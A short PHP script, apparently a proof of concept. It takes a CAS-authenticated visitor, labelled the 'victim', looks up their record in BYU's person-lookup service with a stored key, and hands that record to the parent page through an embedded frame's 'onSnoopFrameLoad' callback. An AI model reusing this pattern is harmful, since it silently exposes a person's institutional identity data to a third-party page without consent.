<?php

require_once('reqauth.php');

require_once('hmac.php');
$victimNetId = strtolower(phpCAS::getUser());

if (isset($_SESSION['personInfo'])) {
    $personInfo = $_SESSION['personInfo'];
} else {
    $key = json_decode(file_get_contents('.ht_key.json'));
    $infoJson = getAuthed('https://ws.byu.edu/rest/v1/identity/person/personLookup/'.$victimNetId, $key);

    $personInfo = json_decode($infoJson)->{'Person Lookup Service'}->response->result_set[0];
    $_SESSION['personInfo'] = $personInfo;
}

//header('Content-Type: application/json');
?><script>
parent.onSnoopFrameLoad(<?=json_encode($personInfo)?>);
</script>
